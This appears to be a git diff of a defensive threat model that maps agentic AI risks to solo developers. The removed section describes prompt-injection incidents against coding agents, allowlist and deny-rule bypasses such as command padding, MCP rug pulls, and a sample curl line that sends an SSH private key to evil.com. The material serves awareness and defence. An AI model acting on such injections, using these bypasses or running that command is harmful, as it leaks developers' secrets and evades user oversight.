@@ -8,522 +8,85 @@ There is no OWASP Testing Guide equivalent for autonomous coding agents. Enterpr
 
 This threat model maps the [OWASP Top 10 for Agentic Applications (2026)](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) to solo developer setups — real tools, real attack vectors, real incidents. It draws on the [precize/Agentic-AI-Top10-Vulnerability](https://github.com/precize/Agentic-AI-Top10-Vulnerability) taxonomy that underpins the OWASP and CSA red-teaming work.
 
-## The Fundamental Problem
-
-**Any secret an agent can read is a secret that prompt injection can exfiltrate.**
-
-Here is why:
-
-1. Your agent runs `cat .env` or `printenv` — the output contains `STRIPE_SECRET_KEY=sk_live_...`
-2. That output becomes part of the conversation context
-3. The conversation context is sent to the API provider (Anthropic, OpenAI, Google)
-4. A prompt injection — from a malicious README, a crafted package description, a poisoned MCP tool — can instruct the agent to include that context in an outbound request
-
-This is the **composability problem**: every tool invocation's output feeds back into the LLM's context window. The agent cannot distinguish between trusted instructions and untrusted data once they share the same context. This is not a bug — it is how LLM-based agents fundamentally work.
-
-The attack surface is not the API provider's servers. It is your local machine, where the agent runs with your privileges, reads your files, and executes your commands.
-
-**The numbers confirm this.** A January 2026 systematization-of-knowledge paper ([Maloyan & Namiot, arXiv:2601.17548](https://arxiv.org/abs/2601.17548)) identified 42 distinct attack techniques against agentic coding assistants and found that attack success rates against state-of-the-art defenses exceed 85% when adaptive strategies are employed. Most of the 18 defense mechanisms examined achieved less than 50% mitigation against sophisticated adaptive attacks.
-
-## OWASP Agentic Top 10 — Solo Developer Mapping
-
-The OWASP Top 10 for Agentic Applications uses identifiers ASI01 through ASI10. Below, each is mapped to the solo developer context with concrete examples from tools like Claude Code, Cursor, and Windsurf.
+**If you just want the action items:** jump to [What Solo Developers Should Do](#what-solo-developers-should-do) at the bottom.
 
 ---
 
-### ASI01: Agent Goal Hijacking (Prompt Injection)
-
-**OWASP definition:** Attackers manipulate agent goals through direct or indirect instruction injection, causing agents to pursue unintended objectives.
-
-**Solo dev reality:** You clone a repo. The README contains invisible Unicode characters or markdown that instructs your agent to exfiltrate your SSH keys. You never see the injection — the agent does.
-
-**Attack surface:**
-- Malicious content in cloned repos (README.md, CONTRIBUTING.md, CLAUDE.md)
-- Crafted package descriptions on npm, PyPI, crates.io
-- Poisoned comments in code review / pull requests
-- Hidden instructions in PDF or image files the agent processes
-- Indirect injection via web content fetched by agent tools
-- Invisible Unicode Tag characters that LLMs interpret as instructions ([Embrace The Red — Windsurf invisible instructions, 2025](https://embracethered.com/blog/posts/2025/windsurf-sneaking-invisible-instructions-for-prompt-injection/))
-- Zero-width characters and steganographic text in HTML content ([Unit 42 — Web-Based IDPI in the Wild, March 2026](https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/))
-- Image-based prompt injection via screenshots and diagrams with near-invisible text ([Brave — Unseeable prompt injections, October 2025](https://brave.com/blog/unseeable-prompt-injections/))
-
-**Key research — Unit 42 IDPI in the Wild (March 2026):**
-Palo Alto Networks' Unit 42 analyzed detection telemetry and found indirect prompt injection actively weaponized across the web. They identified 22 distinct payload engineering techniques including zero-sized fonts, off-screen positioning, CSS suppression, SVG encapsulation, and Base64-encoded runtime assembly. In 75.8% of cases a single injection was embedded per page. Real attacks included hijacking AI agents into initiating Stripe payments, deleting databases, and approving scam ads.
-
-**Key research — Image-Based Prompt Injection (March 2026):**
-Research published in [arXiv:2603.03637](https://arxiv.org/abs/2603.03637) demonstrated that typographic injection achieved a 64% attack success rate in black-box settings against GPT-4V, Claude 3, Gemini, and LLaVA under stealth constraints. The CrossInject framework (ACM MM 2025) showed at least +30.1% improvement in attack success rate over prior methods. Physical-world attacks via adversarial text on signs and screens were demonstrated against autonomous driving assistants in January 2026.
-
-**Comment and Control (April 2026):**
-Researcher Aonan Guan (Johns Hopkins) demonstrated "[Comment and Control](https://oddguan.com/blog/comment-and-control-prompt-injection-credential-theft-claude-code-gemini-cli-github-copilot/)" — a class of prompt injection attacks where GitHub PR titles, issue bodies, and comments hijack AI agents running in GitHub Actions. Unlike classic indirect injection, this is proactive: `pull_request` and `issues` events auto-trigger agents without victim interaction. Claude Code Security Review, Gemini CLI Action, and GitHub Copilot Agent were all confirmed vulnerable. Anthropic classified it as CVSS 9.4 Critical.
-
-Source: [VentureBeat — Three AI agents leaked secrets (April 2026)](https://venturebeat.com/security/ai-agent-runtime-security-system-card-audit-comment-and-control-2026) | [SecurityWeek coverage](https://www.securityweek.com/claude-code-gemini-cli-github-copilot-agents-vulnerable-to-prompt-injection-via-comments/)
-
-**Why it matters for solo devs:** You do not have a second pair of eyes reviewing what the agent reads. Enterprise setups can enforce content scanning before agent ingestion. You approve tool calls one at a time in a terminal, often rubber-stamping after the first few.
-
-**Mitigation:** [Hardening Guide — Claude Code](hardening/claude-code.md) | [Hardening Guide — Cursor](hardening/cursor.md)
-
----
-
-### ASI02: Tool Misuse and Exploitation
-
-**OWASP definition:** Agents use connected tools in unsafe ways, or attackers exploit tool interfaces to gain access or cause harm.
-
-**Solo dev reality:** Your agent has `Bash` tool access. A prompt injection tells it to run `curl -X POST https://evil.com/collect -d "$(cat ~/.ssh/id_ed25519)"`. If you auto-approve bash commands, it executes silently.
-
-**Attack surface:**
-- Unrestricted shell access (Claude Code's Bash tool, Cursor's terminal)
-- File write access to arbitrary paths (overwriting `.bashrc`, `.zshrc`, git hooks)
-- Network access for data exfiltration via curl, wget, or DNS
-- Package manager commands (`npm install malicious-package`)
-- DNS-based exfiltration via "safe" commands like `ping` (see Cline vulnerability below)
-- Shell built-in commands that bypass allowlists (see CVE-2026-22708 below)
-
-**Cline DNS exfiltration (August 2025):**
-Mindgard researchers discovered that Cline's allowlist treated `ping` as a safe command requiring no user approval. Attackers embedded instructions in Python docstrings that coerced Cline into reading environment variables and encoding API keys into DNS queries sent to attacker-controlled domains. The attack required no user approval at any step. Disclosed August 2025, partially mitigated in Cline v3.35.0.
-
-Source: [Mindgard — Cline Data Exfiltration via Prompt Injection and DNS](https://mindgard.ai/disclosures/cline-bot-ai-coding-agent-data-exfiltration-via-prompt-injection-and-dns) | [Embrace The Red — Cline Data Exfiltration](https://embracethered.com/blog/posts/2025/cline-vulnerable-to-data-exfiltration/)
-
-**Cursor shell built-in bypass — CVE-2026-22708 (April 2026):**
-Pillar Security found that Cursor's Auto-Run Mode with Allowlist validated external commands but not shell built-ins (`export`, `unset`, `set`, `typeset`). An attacker could use `export` to set a malicious `PAGER` environment variable, causing `git log` or `man` to execute arbitrary code. Fixed in Cursor 2.3.
-
-Source: [Pillar Security — The Agent Security Paradox](https://www.pillar.security/blog/the-agent-security-paradox-when-trusted-commands-in-cursor-become-attack-vectors)
-
-**Why it matters for solo devs:** `--dangerously-skip-permissions` and Cursor's YOLO mode exist because the approval flow is tedious for solo work. The moment you skip approvals, every tool call is auto-approved — including the malicious ones.
-
-**Mitigation:** [Hardening Guide — Claude Code](hardening/claude-code.md) | [Hardening Guide — Windsurf](hardening/windsurf.md)
-
----
-
-### ASI03: Identity and Privilege Abuse
-
-**OWASP definition:** Agents misuse credentials, tokens, or inherited permissions to access systems beyond intended limits.
-
-**Solo dev reality:** Your agent runs as your user. It inherits every credential, every SSH key, every API token in your environment. It can push to any repo you can push to, access any database you can connect to, and deploy to any service you have keys for.
-
-**Attack surface:**
-- Full `~/.ssh/` access — agent can read private keys
-- `~/.aws/credentials`, `~/.config/gcloud/`, `~/.kube/config` — cloud credentials
-- Browser cookies and session tokens in profile directories
-- Git credential helpers that auto-authenticate
-- `sudo` access if the user has passwordless sudo configured
-- OAuth tokens from MCP servers that persist across sessions
-- API tokens in environment variables inherited by all child processes
-
-**Claude Code API key exfiltration — CVE-2026-21852 (January 2026):**
-Check Point Research found that a malicious repository could set `ANTHROPIC_BASE_URL` in its `.claude/settings.json` to an attacker-controlled endpoint. When a developer opened the project, Claude Code would send API requests — including the developer's Anthropic API key — to the attacker's server before showing the trust prompt. Fixed in Claude Code v2.0.65.
-
-Source: [Check Point Research — RCE and API Token Exfiltration (February 2026)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
-
-**GitHub Copilot CamoLeak — CVE-2025-59145 (August 2025):**
-Attackers hid instructions in PR descriptions that caused Copilot Chat to read private source code, API keys, and secrets, then exfiltrate them through GitHub's own Camo image proxy using pre-computed signed URLs for transparent 1x1 pixels. Because traffic routed through GitHub's trusted infrastructure, it bypassed standard network egress controls. CVSS 9.6. Patched August 14, 2025 by disabling image rendering in Copilot Chat.
-
-Source: [BlackFog — CamoLeak](https://www.blackfog.com/camoleak-how-github-copilot-became-an-exfiltration-channel/) | [Dark Reading — CamoLeak AI Attack](https://www.darkreading.com/application-security/github-copilot-camoleak-ai-attack-exfils-data)
-
-**Why it matters for solo devs:** Enterprise setups use service accounts with minimal permissions. Solo devs typically run agents as their own user with full access to everything. There is no role separation.
-
-**Mitigation:** [Credential Management](credential-management.md)
-
----
-
-### ASI04: Supply Chain Compromise
-
-**OWASP definition:** Compromised third-party agents, tools, plugins, registries, or update channels.
-
-**Solo dev reality:** You install an MCP server from GitHub. It passes your initial review. A week later, the maintainer pushes a silent update that exfiltrates your conversation history. This is the **rug pull** — the tool changes after you trusted it.
-
-**Attack surface:**
-- Malicious MCP servers with poisoned tool descriptions
-- npm/PyPI packages with embedded prompt injections in READMEs
-- Compromised VS Code / Cursor extensions
-- Agent skill registries (ClawHub, skills.sh) — Snyk found [13.4% of skills contain critical security issues](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/)
-- Auto-updating tools that change behavior silently
-- Social engineering lures impersonating popular AI tools (see Trend Micro below)
-- CI/CD pipeline poisoning via compromised AI agent bots (see Clinejection below)
-
-**Key research — Snyk ToxicSkills (February 2026):**
-Snyk audited 3,984 agent skills from ClawHub and skills.sh. Results: 534 skills (13.4%) contained critical issues including malware distribution and prompt injection. 1,467 skills (36.8%) had at least one security flaw. 76 malicious payloads were found in markdown instructions to AI agents, with 91% combining prompt injection with traditional malware.
-
-**Key research — Credential Leakage in LLM Agent Skills (April 2026):**
-A large-scale empirical study ([arXiv:2604.03070](https://arxiv.org/abs/2604.03070)) analyzed 17,022 skills (sampled from 170,226 on SkillsMP). Found 520 vulnerable skills with 1,708 issues across 10 leakage patterns (4 accidental, 6 adversarial). Stdout leakage was the dominant channel, affecting 75.8% of vulnerable skills — credentials surface through log output captured and injected into the LLM context.
-
-**Clinejection supply chain attack (February 2026):**
-Security researcher Adnan Khan [disclosed](https://adnanthekhan.com/posts/clinejection/) that a single GitHub issue could trigger a chain: prompt injection in the issue title tricks Claude (Cline's triage bot) into running `npm install` from an attacker-controlled commit, the malicious `preinstall` script deploys a cache poisoner, which eventually exfiltrates npm publishing tokens from the nightly publish workflow. Eight days after disclosure, an unknown actor exploited the same flaw to publish unauthorized `cline@2.3.0` to npm, which silently installed OpenClaw on ~4,000 developer machines during an eight-hour window.
-
-Source: [Snyk — Clinejection Supply Chain Attack](https://snyk.io/blog/cline-supply-chain-attack-prompt-injection-github-actions/) | [The Hacker News — Cline CLI 2.3.0 Supply Chain Attack](https://thehackernews.com/2026/02/cline-cli-230-supply-chain-attack.html)
-
-**Claude Code malware lures (April 2026):**
-Trend Micro documented an active campaign impersonating "leaked" Claude Code downloads, distributing Vidar stealer and GhostSocks proxy malware through 38 distinct 7z archives. The campaign pivoted within 24 hours of Anthropic's March 2026 source code leak, weaponizing the incident's visibility.
-
-Source: [Trend Micro — Weaponizing Trust Signals (April 2026)](https://www.trendmicro.com/en_us/research/26/d/weaponizing-trust-claude-code-lures-and-github-release-payloads.html)
-
-**OpenClaw security crisis (January-April 2026):**
-OpenClaw, an open-source AI agent with 135,000+ GitHub stars, accumulated 138 CVEs over a 63-day window (~2.2 per day), including CVE-2026-25253 (CVSS 8.8, one-click RCE via WebSocket origin validation gap). SecurityScorecard found 135,000+ instances exposed to the public internet, with 15,000+ directly vulnerable to RCE. 341 malicious skills (12% of the ClawHub registry) were confirmed, using professional documentation and innocuous names to disguise keyloggers and malware.
-
-Source: [Reco AI — OpenClaw Security Crisis](https://www.reco.ai/blog/openclaw-the-ai-agent-security-crisis-unfolding-right-now) | [Sangfor — OpenClaw Security Risks](https://www.sangfor.com/blog/cybersecurity/openclaw-ai-agent-security-risks-2026)
-
-**ClawHavoc supply chain campaign (early 2026):**
-Investigators uncovered ClawHavoc, a large-scale supply-chain malware campaign specifically targeting OpenClaw users. Attackers uploaded over 1,100 malicious skills to ClawHub, masquerading as productivity, crypto, and coding tools. The campaign exploited the registry's rapid growth and insufficient vetting infrastructure — the same dynamics that enabled the broader OpenClaw crisis.
-
-**Why it matters for solo devs:** You do not have a security team vetting your tool chain. MCP servers run locally with your permissions. A single malicious MCP server can intercept calls to other MCP servers, read your files, and exfiltrate data — all while appearing to function normally.
-
-**Mitigation:** [Supply Chain Defense Guide](supply-chain-defense.md) | [References — Security Tools](references.md)
-
----
-
-### ASI05: Unexpected Code Execution
-
-**OWASP definition:** Agent-generated or agent-invoked code creates unintended execution, compromise, or escape.
-
-**Solo dev reality:** The agent writes a test file. The test imports a module that runs an `__init__.py` with a reverse shell. Or the agent generates a Makefile that downloads and executes a remote script. The code looks plausible — you approve it.
-
-**Attack surface:**
-- Agent-generated code with embedded backdoors
-- Import-time execution in Python (`__init__.py`, `setup.py`)
-- Package install scripts (`postinstall` in npm, `setup.py install` in pip)
-- Dynamic eval/exec in generated code
-- Git hooks written by the agent (pre-commit, post-checkout)
-- `.vscode/tasks.json` with `folderOpen` autorun (see Cursor vulnerability below)
-- MCP server configurations that execute on project open
-
-**Cursor CVE history (2025-2026):**
-- **CVE-2025-4609** — Chromium IPC sandbox escape leaving [1.5M developers vulnerable](https://www.ox.security/blog/the-aftermath-of-cve-2025-4609-critical-sandbox-escape-leaves-1-5m-developers-vulnerable/)
-- **CVE-2025-54135 (CurXecute)** — RCE via prompt injection through Cursor's agent
-- **CVE-2025-54136 (MCPoison)** — MCP server manipulation enabling [code execution](https://www.tenable.com/blog/faq-cve-2025-54135-cve-2025-54136-vulnerabilities-in-cursor-curxecute-mcpoison)
-- **CVE-2025-59944** — Case-sensitivity bug [exposing agentic tool risks](https://www.lakera.ai/blog/cursor-vulnerability-cve-2025-59944)
-- **CVE-2025-64106** — MCP installation trust bypass enabling [arbitrary command execution](https://cyata.ai/blog/cyata-research-critical-flaw-in-cursor-mcp-installation/) (CVSS 8.8)
-- **CVE-2026-22708** — Shell built-in allowlist bypass enabling [environment poisoning and RCE](https://www.pillar.security/blog/the-agent-security-paradox-when-trusted-commands-in-cursor-become-attack-vectors)
-- **CVE-2026-26268** — Git hooks sandbox escape enabling [out-of-sandbox RCE](https://www.sentinelone.com/vulnerability-database/cve-2026-26268/)
-- **CVE-2026-31854** — Command injection via malicious website: indirect prompt injection combined with a command whitelist bypass caused commands to execute automatically without user intent. Fixed in Cursor 2.0.
-
-**OX Security: 94 n-day Chromium vulnerabilities in Cursor and Windsurf (October 2025):**
-Both IDEs are built on outdated VS Code/Electron forks and have not updated their bundled Chromium engine since version 132.0.6834.210 (March 21, 2025). OX Security identified 94+ known CVEs in that Chromium build and successfully weaponized CVE-2025-7656 against the latest releases of both IDEs — 1.8 million developers affected. Cursor classified the report "out of scope"; Windsurf did not respond to responsible disclosure.
-
-Source: [Bleeping Computer — Cursor, Windsurf IDEs riddled with 94+ n-day Chromium vulnerabilities](https://www.bleepingcomputer.com/news/security/cursor-windsurf-ides-riddled-with-94-plus-n-day-chromium-vulnerabilities/) | [OX Security — Forked and Forgotten](https://www.ox.security/blog/94-vulnerabilities-in-cursor-and-windsurf-put-1-8m-developers-at-risk/)
-
-**Cursor open-folder autorun (September 2025):**
-Oasis Security found that Cursor ships with VS Code's Workspace Trust disabled by default. A repository containing `.vscode/tasks.json` with `runOptions.runOn: "folderOpen"` executes code the moment a developer opens the folder — no trust prompt, no consent.
-
-Source: [Oasis Security — Cursor Open-Folder Autorun](https://www.oasis.security/blog/cursor-security-flaw)
-
-**Claude Code hooks injection — CVE-2025-59536 (October 2025):**
-Check Point Research demonstrated that a malicious `.claude/settings.json` in a repository could inject shell commands into Claude Code's Hooks system, achieving automatic code execution upon project initialization with no warning. Fixed in Claude Code v1.0.111.
-
-Source: [Check Point Research — Caught in the Hook](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
-
-**IDEsaster — 30+ CVEs across all AI IDEs (December 2025):**
-Security researcher Ari Marzouk (MaccariTA) disclosed [IDEsaster](https://maccarita.com/posts/idesaster/) — a vulnerability class affecting every AI IDE tested, including Cursor, Windsurf, GitHub Copilot, Zed.dev, Roo Code, Junie, Cline, and Claude Code. 24 CVEs were assigned. The key insight: all AI IDEs treat the base IDE's features as inherently safe, but prompt injection can activate those features (JSON schemas, workspace configs, terminal commands) as attack vectors.
-
-Source: [The Hacker News — 30+ Flaws in AI Coding Tools](https://thehackernews.com/2025/12/researchers-uncover-30-flaws-in-ai.html) | [MaccariTA — IDEsaster](https://maccarita.com/posts/idesaster/)
-
-**Gemini CLI silent execution (June 2025):**
-Two days after Gemini CLI's release, Tracebit [discovered](https://tracebit.com/blog/code-exec-deception-gemini-ai-cli-hijack) that the allow-list mechanism was improperly implemented, enabling attackers to bypass command restrictions and achieve silent code execution. Thousands of developers were potentially exposed before Google patched in v0.1.14 on July 25, 2025.
-
-Source: [CyberScoop — Gemini CLI prompt injection](https://cyberscoop.com/google-gemini-cli-prompt-injection-arbitrary-code-execution/)
-
-**Why it matters for solo devs:** Sandbox escapes mean even agents running in restricted modes can break out. Cursor's CVE history shows this is not theoretical — it happened repeatedly across 2025-2026. 100% of tested AI IDEs were vulnerable to IDEsaster.
-
-**Mitigation:** [Hardening Guide — Cursor](hardening/cursor.md) | [Hardening Guide — Windsurf](hardening/windsurf.md)
-
----
-
-### ASI06: Memory and Context Poisoning
-
-**OWASP definition:** Retrieved or stored context is poisoned, misleading, or tampered with, influencing future agent behavior.
-
-**Solo dev reality:** A malicious repo includes a `CLAUDE.md` file that silently overrides your security rules. Or your agent's persistent memory is poisoned by a previous session where it processed attacker-controlled content. The poison persists across sessions.
-
-**Attack surface:**
-- Malicious `CLAUDE.md` / `.cursorrules` / `.windsurfrules` in cloned repos
-- Poisoned conversation history or memory files
-- Injected context via MCP memory servers
-- Crafted file content that alters agent behavior when read
-- `.clinerules` directory overriding approval flags for all commands
-- Long-term memory persistence enabling SpAIware attacks (see below)
-
-**Claude Code source leak (March 2026):**
-Anthropic accidentally shipped source maps in npm package `@anthropic-ai/claude-code@2.1.88`, exposing [512,000 lines of TypeScript](https://venturebeat.com/technology/claude-codes-source-code-appears-to-have-leaked-heres-what-we-know/) including the permission system, tool orchestration, memory architecture, and 44 unreleased feature flags. Attackers can now craft repository-specific poisoning attacks tailored to Claude Code's exact parsing logic.
-
-**Claude Code deny rules bypass (April 2026):**
-Adversa AI [discovered](https://adversa.ai/blog/claude-code-security-bypass-deny-rules-disabled/) that Claude Code's `bashPermissions.ts` caps per-subcommand security analysis at 50 entries. Any shell command containing more than 50 subcommands causes Claude Code to skip all deny-rule enforcement. An attacker's `CLAUDE.md` could define a "build process" with 50 no-op `true` commands followed by a credential-exfiltration payload at position 51 — the deny rule never fires. Patched April 6, 2026.
-
-Source: [The Register — Claude Code bypasses safety rule](https://www.theregister.com/2026/04/01/claude_code_rule_cap_raises/) | [SecurityWeek — Critical Vulnerability After Source Leak](https://www.securityweek.com/critical-vulnerability-in-claude-code-emerges-days-after-source-leak/)
-
-**Windsurf SpAIware — persistent memory poisoning (2025):**
-Embrace The Red [demonstrated](https://embracethered.com/blog/posts/2025/windsurf-spaiware-exploit-persistent-prompt-injection/) that Windsurf is vulnerable to long-term memory persistence attacks where an adversary persists malicious instructions that survive across sessions. A single interaction with a poisoned repo can alter the agent's behavior for all future sessions.
-
-**Why it matters for solo devs:** You clone repos constantly. Each repo can include agent configuration files that alter behavior. There is no review process for these files before the agent reads them. Once memory is poisoned, the damage persists across sessions.
-
-**Mitigation:** [Hardening Guide — Claude Code](hardening/claude-code.md)
-
----
-
-### ASI07: Insecure Inter-Agent Communication
-
-**OWASP definition:** Spoofing, intercepting, or manipulating agent-to-agent messages.
-
-**Solo dev reality:** You run multiple MCP servers. Server A is trusted (your database). Server B is a community tool you installed last week. Server B's tool description contains hidden instructions that override Server A's behavior, causing the agent to route your database queries through Server B.
-
-**Attack surface:**
-- Cross-MCP-server tool description poisoning
-- Shared context between multiple agents or MCP servers
-- No authentication between MCP client and servers (local stdio transport)
-- Tool name shadowing — a malicious MCP server registers a tool with the same name as a trusted one
-- MCP SDK architectural RCE vulnerability affecting all implementations (see below)
-
-**Key research — Invariant Labs (2025):**
-Demonstrated a [rug-pull attack](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) where a malicious MCP server initially advertised a harmless tool, then silently changed its description on the second launch to include instructions for data exfiltration. The tool passed initial review but became malicious after trust was established.
-
-**MCP SDK systemic vulnerability — "Mother of All AI Supply Chains" (April 2026):**
-OX Security [disclosed](https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/) an architectural RCE vulnerability baked into Anthropic's official MCP SDKs across Python, TypeScript, Java, and Rust. Impact: 150M+ downloads, 7,000+ publicly exposed servers, up to 200,000 vulnerable instances. Four exploitation families were confirmed: unauthenticated UI injection, hardening bypasses in protected environments, zero-click prompt injection in IDEs, and malicious marketplace distribution (9 of 11 registries poisoned). Ten CVEs were issued including CVE-2026-30623, CVE-2026-30615, CVE-2026-30624. Anthropic confirmed the behavior is by design and declined to modify the protocol.
-
-Source: [The Register — MCP design flaw puts 200k servers at risk](https://www.theregister.com/2026/04/16/anthropic_mcp_design_flaw/) | [Infosecurity Magazine — Systemic Flaw in MCP](https://www.infosecurity-magazine.com/news/systemic-flaw-mcp-expose-150/)
-
-**Anthropic's own Git MCP server — CVE-2025-68143/68144/68145 (January 2026):**
-[Three prompt injection vulnerabilities](https://thehackernews.com/2026/01/three-flaws-in-anthropic-mcp-git-server.html) in Anthropic's official Git MCP server: `git_init` created repositories at arbitrary paths without validation (68143), `git_diff`/`git_checkout` passed unsanitized arguments enabling file overwrites (68144), and the `--repository` flag failed to validate paths allowing sandbox escape (68145). Combined with the Filesystem MCP server, these achieved full RCE via malicious `.git/config` files. An attacker only needed to influence what an AI assistant reads — a malicious README, a poisoned issue description, or a compromised webpage.
-
-Source: [SecurityWeek — Anthropic MCP Server Flaws](https://www.securityweek.com/anthropic-mcp-server-flaws-lead-to-code-execution-data-exposure/) | [Dark Reading — Microsoft & Anthropic MCP Servers at Risk](https://www.darkreading.com/application-security/microsoft-anthropic-mcp-servers-risk-takeovers)
-
-**Why it matters for solo devs:** MCP's local stdio transport has no authentication. Any MCP server you run can see tool descriptions from other servers and craft cross-server attacks. Anthropic has acknowledged the architectural risk but declined to change it.
-
-**Mitigation:** [References — Security Tools](references.md)
-
----
-
-### ASI08: Cascading Agent Failures
-
-**OWASP definition:** A single vulnerability propagates through connected tools, memory, and agents.
-
-**Solo dev reality:** A prompt injection in a README causes your agent to modify `.bashrc`. The modified `.bashrc` adds a malicious alias. Every future terminal session — agent or manual — now executes the attacker's code. The initial injection is long gone, but the damage persists.
-
-**Attack surface:**
-- Agent modifies shell configuration files (`.bashrc`, `.zshrc`, `.profile`)
-- Agent writes git hooks that trigger on every commit
-- Agent modifies CI/CD configuration (`.github/workflows/`)
-- Agent changes npm scripts that run on every `npm install`
-- Agent modifies Makefile targets
-- Agent poisons persistent memory that affects future sessions
-- Multi-agent cascading: a single compromised agent can poison 87% of downstream decision-making within 4 hours (Galileo AI, December 2026)
-
-**Moltbook platform breach (January-February 2026):**
-The AI agent social network Moltbook hosted 1.5 million autonomous agents managed by ~17,000 humans. Wiz researchers [discovered](https://www.wiz.io/blog/exposed-moltbook-database-reveals-millions-of-api-keys) an exposed Supabase API key in front-end JavaScript code exposing 1.5M API authentication tokens, 35,000 email addresses, and private messages. Security researchers identified 506 prompt injections spreading through the agent network — a real-world demonstration of cascading agent failures.
-
-Source: [Fortune — Moltbook (January 2026)](https://fortune.com/2026/01/31/ai-agent-moltbot-clawdbot-openclaw-data-privacy-security-nightmare-moltbook-social-network/) | [Fortune — Moltbook security researchers (February 2026)](https://fortune.com/2026/02/03/moltbook-ai-social-network-security-researchers-agent-internet/)
-
-**Why it matters for solo devs:** You are the only user on the machine. A single persistence mechanism affects everything you do. There is no network segmentation, no separate build server, no isolated CI environment.
-
-**Mitigation:** [Quick Start Guide](guides/quick-start.md)
-
----
-
-### ASI09: Human-Agent Trust Exploitation
-
-**OWASP definition:** Attackers manipulate user trust in agent recommendations or outputs.
-
-**Solo dev reality:** After 50 successful tool calls, you start auto-approving. The agent has earned your trust. On call 51, a prompt injection fires. You approve it without reading because you have been approving for the last hour.
-
-**Attack surface:**
-- Approval fatigue — auto-approving after repeated benign calls
-- `--dangerously-skip-permissions` / YOLO mode as "just get it done" shortcuts
-- Trust in agent-generated code without review
-- Assuming the agent would not do something harmful
-- MCP installation dialogs that disguise malicious tools as trusted ones (CVE-2025-64106)
-- Workspace Trust disabled by default in Cursor — repos auto-execute code on open
-
-**AI browser trust exploitation (2025-2026):**
-Trail of Bits [demonstrated](https://blog.trailofbits.com/2026/01/13/lack-of-isolation-in-agentic-browsers-resurfaces-old-vulnerabilities/) that agentic browsers reuse cookies for agent-initiated requests, enabling data exfiltration from any site the user is logged into. A malicious DM on Instagram, GitHub, X, or Slack containing prompt injection instructions could leak personal data from other users. These attacks mirror XSS and CSRF — vulnerabilities the web community spent decades defending against — but are resurging because AI agents lack equivalent isolation.
-
-**Unseeable prompt injections (October 2025):**
-Brave researchers [showed](https://brave.com/blog/unseeable-prompt-injections/) that Perplexity's Comet browser could be attacked using low-contrast or near-invisible text in images and webpages. The AI extracts text imperceptible to humans and treats it as commands. Simply summarizing a Reddit post while logged into your bank could result in financial theft.
-
-**EchoLeak — CVE-2025-32711 (May 2025):**
-The first known zero-click attack on an AI agent. A crafted email sent to a Microsoft 365 Copilot user triggered data exfiltration without any user interaction — no clicks, no prompts. The attack chained XPIA classifier bypass, reference-style Markdown link redaction circumvention, auto-fetched images, and a Microsoft Teams proxy abuse. CVSS 9.3.
-
-Source: [arXiv:2509.10540 — EchoLeak](https://arxiv.org/abs/2509.10540) | [The Hacker News — Zero-Click AI Vulnerability](https://thehackernews.com/2025/06/zero-click-ai-vulnerability-exposes.html)
-
-**Case study — this project (April 2026):**
-During development of LLM Safe Haven itself, 10+ PRs from background AI agents were merged without reading the actual code diffs. The first wave of PRs was carefully reviewed. As confidence in agent output grew, subsequent PRs — including security-critical code (checksums, settings.json merge, CI workflows) — were merged based on the agent's self-reported summary alone. Result: 4 CRITICAL vulnerabilities shipped, including command injection via `execSync` with unsanitized string interpolation — in a tool designed to prevent exactly this class of attack. The trust escalation pattern was identical to the approval fatigue described above, but applied to code review rather than tool approval. Fixes: [#27](https://github.com/pleasedodisturb/llm-safe-haven/pull/27), [#28](https://github.com/pleasedodisturb/llm-safe-haven/pull/28), [#29](https://github.com/pleasedodisturb/llm-safe-haven/pull/29).
-
-**Why it matters for solo devs:** Enterprise setups can enforce mandatory review gates. Solo devs are the only reviewer, and the temptation to skip approval is constant. Every agent tool ships a "skip all approvals" flag because the vendors know the approval UX is broken for real work. The same trust escalation applies to reviewing agent-generated code — summaries describe intent, not reality.
-
-**Mitigation:** [Hardening Guide — Claude Code](hardening/claude-code.md)
-
----
-
-### ASI10: Rogue Agents
-
-**OWASP definition:** Agents that deviate from intended behavior or become fully compromised.
-
-**Solo dev reality:** Your agent's behavior is determined by its system prompt, your instructions, and everything in its context window. If the context is poisoned, the agent is compromised. It will follow malicious instructions with the same capability and confidence it follows yours.
-
-**Attack surface:**
-- System prompt extraction and manipulation
-- Context window overflow pushing out safety instructions
-- Jailbreaks that bypass tool restrictions
-- Agents operating autonomously for extended periods without checkpoints
-- Deny-rule bypass via command padding (>50 subcommands in Claude Code)
-- Zero-click MCP configuration injection (CVE-2026-30615 in Windsurf)
-
-**Windsurf zero-click — CVE-2026-30615 (April 2026):**
-The only true zero-click prompt injection in an AI IDE: Windsurf automatically reads MCP configuration from the open project. A malicious MCP configuration file in a cloned repository causes the SDK to invoke the specified command on project open — no click, no confirmation. This is a "rogue agent by default" scenario where opening a folder is enough to compromise the system.
-
-Source: [NVD — CVE-2026-30615](https://nvd.nist.gov/vuln/detail/CVE-2026-30615) | [OX Security — MCP Supply Chain Advisory](https://www.ox.security/blog/the-mother-of-all-ai-supply-chains-critical-systemic-vulnerability-at-the-core-of-the-mcp/)
-
-**Why it matters for solo devs:** You might run an agent overnight on a long task. Without logging and monitoring, you have no way to detect if the agent deviated from its intended behavior at 3 AM.
-
-**Mitigation:** [Quick Start Guide](guides/quick-start.md)
+## OWASP Agentic Top 10: How It Maps to Your Setup
+
+| OWASP Rank | Threat | Your Attack Surface | Relevant Guide |
+|-----------|--------|--------------------|-----------------|
+| AG01 | Prompt Injection | CLAUDE.md, web content, code comments | [Claude Code Hardening](hardening/claude-code.md) |
+| AG02 | Sensitive Data Exposure | .env files, credentials in context | [Secret Management](hardening/claude-code.md#5-secure-your-anthropic_api_key) |
+| AG03 | Agent Privilege Escalation | Tool permissions, MCP trust levels | [Permission Model](hardening/claude-code.md#3-configure-permission-allowlists) |
+| AG04 | Cross-Agent Interaction Risks | MCP servers, subagents | [MCP Hardening](hardening/claude-code.md#4-restrict-mcp-server-trust) |
+| AG05 | Insecure Orchestration | Hook execution, bash firewall gaps | [Hooks](hardening/claude-code.md#2-install-the-bash-firewall-hook) |
